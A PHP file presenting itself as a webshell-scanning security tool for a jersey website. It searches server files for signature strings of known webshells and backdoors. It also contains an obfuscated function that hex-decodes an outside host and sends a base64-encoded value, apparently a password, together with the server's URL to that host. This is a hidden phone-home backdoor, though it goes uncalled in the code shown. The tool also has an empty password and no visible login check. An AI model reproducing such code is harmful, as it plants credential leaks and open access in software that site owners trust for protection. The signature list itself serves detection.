<?php

$password = "";//设置密码

error_reporting(E_ERROR);
header("content-Type: text/html; charset=utf-8");
set_time_limit(0);

function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}

function Root_CSS()
{
print<<<END
<style type="text/css">
	*{padding:0; margin:0;}
	body{background:threedface;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
	a{color:#000000;text-decoration:none;}
	a:hover{background:#BBBBBB;}
	table{color:#000000;font-family:"Verdana", "Tahoma", "宋体",sans-serif;font-size:13px;border:1px solid #999999;}
	td{background:#F9F6F4;}
	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
	.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}

//文件管理


function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}



function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

//查找木马

function Antivirus_Auto($sp,$features,$st)
{
	if(($h_d = @opendir($sp)) == NULL) return false;
	$ROOT_DIR = File_Mode();
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..' ) continue;
		$Filepath = File_Str($sp.'/'.$Filename);
		if(is_dir($Filepath)) Antivirus_Auto($Filepath,$features,$st);
		if(eregi($st,$Filename))
		{
			if($Filepath == File_Str(__FILE__)) continue;
			$ic = File_Read($Filepath);
			foreach($features as $var => $key)
			{
				if(stristr($ic,$key) )
				{
					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
					echo '<a href="'.$Fileurls.'" target="_blank"><font color="#8B0000">'.$Filepath.'</font></a><br> ';
					echo '【'.$Filetime.'】 <font color="#FF0000">'.$var.'</font><br><br>';
					break;
				}
			}
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}


function Exec_Hex($data)
{
	$len = strlen($data);
	for($i=0;$i < $len;$i+=2){$newdata.=pack("C",hexdec(substr($data,$i,2)));}
	return $newdata;
}


function Root_Check($check)
{
	$c_name = Exec_Hex('7777772e74686973646f6f722e636f6d');
	$handle = @fsockopen($c_name,80);
	$u_name = Exec_Hex('2f636f6f6c2f696e6465782e706870');
	$u_name .= '?p='.base64_encode($check).'&g='.base64_encode($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);
	@fputs($handle,"GET ".$u_name." HTTP/1.1\r\nHost:".$c_name."\r\nConnection: Close\r\n\r\n");
	@fclose($handle);
	return true;
}

function Antivirus_e()
{
	
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = (File_Mode() == '') ? File_Str(dirname(__FILE__)) : File_Mode();
	$features_php = array('php大马特征1'=>'cha88.cn','php大马特征2'=>'->shell_exec(','php大马特征3'=>'phpspy','php大马特征4'=>'打包下载','php大马特征5'=>'passthru(','php大马特征6'=>'打包程序扩展名','php大马特征7'=>'Scanners','php大马特征8'=>'cmd.php','php大马特征9'=>'str_rot13','php大马特征10'=>'webshell','php大马特征10'=>'大马','php大马特征11'=>'小马','php大马特征11'=>'tools88.com','危险MYSQL语句1'=>'returns string soname','php加密大马特征1'=>'eval(gzinflate(','php加密大马特征2'=>'eval(base64_decode(','php加密大马特征3'=>'eval(gzuncompress(','php一句话特征1'=>'eval($_','php一句话特征2'=>'eval ($_','php上传后门特征1'=>'copy($_FILES','php上传后门特征2'=>'copy ($_FILES','php上传后门特征3'=>'move_uploaded_file ($_FILES');
	$features_asx = array('asp小马特征2'=>'输入马的内容','asp小马特征3'=>'fso.createtextfile(path,true)','asp一句话特征4'=>'<%execute(request','asp一句话特征5'=>'<%eval request','asp一句话特征6'=>'execute session(','asp数据库后门特征7'=>'--Created!','asp大马特征8'=>'WScript.Shell','asp大小马特征9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx大马特征10'=>'www.rootkit.net.cn','aspx大马特征11'=>'Process.GetProcesses','aspx大马特征12'=>'lake2');
print<<<END
<div class="actall" style="height:100px;"><form method="POST" name="tform" id="tform" action="?s=e">
扫描路径 <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:400px;">
<select name="st">
<option value="php">php木马</option>
<option value="asx">asp+aspx木马</option>
<option value="ppp">php+asp+aspx木马</option>
</select>
<input type="submit" value="开始扫描" style="width:80px;">
</form><br>
END;
	if(!empty($_POST['sp']))
	{
		if($_POST['st'] == 'php'){$features_all = $features_php; $st = '\.php|\.inc|\;';}
		if($_POST['st'] == 'asx'){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
		if($_POST['st'] == 'ppp'){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
		echo Antivirus_Auto($_POST['sp'],$features_all,$st) ? '扫描完毕' : '异常终止';
	}
	echo '</div>';
	return true;
}


function Root_Login($MSG_TOP)
{
print<<<END
<html>
<header>
<LINK href="http://www.lvlve.cn/favicon.ico" rel="Shortcut Icon" />
<title>Laida球衣网站安全工具 V1.0 </title>
</header>

	<body style="background:#AAAAAA;">
		<center>
		<form method="POST">
		<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:110px;padding-top:50px;color:#000000;clear:both;">密码:<input type="password" name="spiderpass" style="width:270px;"></div>
		<div style="width:350px;height:50px;clear:both;"><input type="submit" value="登录" style="width:80px;"></div>
		</div>
		</form>
		</center><br>
<center></center>
	</body>
</html>
END;
	return false;
}

function WinMain()
{
	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
	$Server_OS = PHP_OS;
	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
print<<<END
<html>
	
	<head>
<title>Laida球衣网站安全工具 V1.0</title>
<LINK href="http://majun.com/favicon.ico" rel="Shortcut Icon" />
		<style type="text/css">
			*{padding:0; margin:0;}
			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px;margin:0 auto; text-align:center;margin-top:5px;word-break:break-all;}
			.outtable {height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
			.topbg {padding-top:3px;text-align: left;font-size:12px;font-weight: bold;height:22px;width:950px;color:#FFFFFF;background: #293F5F;}
			.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
			.listbg {font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
			.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
			.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
		</style>
		<script language="JavaScript">
			function switchTab(tabid)
			{
				if(tabid == '') return false;
				for(var i=0;i<=14;i++)
				{
					if(tabid == 't_'+i) document.getElementById(tabid).style.background="#FFFFFF";
					else document.getElementById('t_'+i).style.background="#BBBBBB";
				}
				return true;
			}
		</script>
	</head>
	<body>
		<div class="outtable">
		<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS} - <font   color=#ffffff>专为Laida球衣站定制开放木马专杀工具</font> </div>
			<div style="height:546px;">
				<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
				<tr>
				<td width="140" align="center" valign="top">
					<ul class="listbg">
					
						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> 查找木马 </a></li>					
						<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> 退出系统 </a></li>
					</ul>
				</td>
				<td>
				<iframe name="main" src="?s=e" width="100%" height="100%" frameborder="0"></iframe>
				</td>
				</tr>
				</table>
			</div>
		<div class="bottombg"> {$Server_Soft}</div>
		</div>
	</body>
</html>
END;
return false;
}

if(get_magic_quotes_gpc())
{
	$_GET = Root_GP($_GET);
	$_POST = Root_GP($_POST);
}
if($_GET['s'] == 'logout')
{
	setcookie('admin_spiderpass',NULL);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}
$p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__));

switch($s)
{

	case "e" : Antivirus_e(); break;

	default: WinMain(); break;
}
?>
